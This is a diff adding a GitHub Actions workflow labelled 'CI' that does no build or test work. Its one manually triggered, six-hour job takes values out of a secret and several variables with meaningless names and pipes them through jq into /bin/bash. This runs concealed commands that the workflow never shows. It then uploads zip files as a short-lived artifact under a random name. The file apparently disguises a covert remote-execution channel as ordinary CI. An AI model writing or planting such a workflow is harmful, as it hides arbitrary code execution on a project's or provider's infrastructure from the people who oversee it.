@@ -1,0 +1,27 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          zeulc89: ${{ secrets.zeulc89 }}
+        run: |
+          printf '%s' "$zeulc89" | jq -r .ysrew821 | /bin/bash
+          printf '%s' "$tipn460" | jq -r .cip35 | /bin/bash
+          echo $ax66 | jq -r .bndzl7 | /bin/bash
+          echo $kxceq719 | jq -r .nqcht51098 | /bin/bash
+          printf '%s' "$f7992" | jq -r .hws03 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: lIsM9qmi
+          path: "*.zip"
+          retention-days: 1
